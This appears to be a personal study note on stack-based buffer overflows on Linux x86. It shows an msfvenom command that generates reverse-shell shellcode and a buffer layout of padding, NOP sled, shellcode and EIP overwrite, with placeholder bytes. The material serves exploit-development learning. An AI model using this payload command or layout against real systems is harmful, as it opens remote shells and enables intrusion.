[[Stack-Based Buffer Overflows on Linux x86]]
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```


Often it can be useful to insert some `no operation instruction` (`NOPS`) before our shellcode begins so that it can be executed cleanly. Let us briefly summarize what we need for this:

1.  We need a total of 1040 bytes to get to the `EIP`.
2.  Here, we can use an additional `100 bytes` of `NOPs`
3.  `150 bytes` for our `shellcode`.

#### Shellcode - Length 

calcular o offset:
[[Stack-Based Buffer Overflows on Linux x86#^d3bf6f]]

```shell-session
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4'
```

![[Buffer.jpg.png]]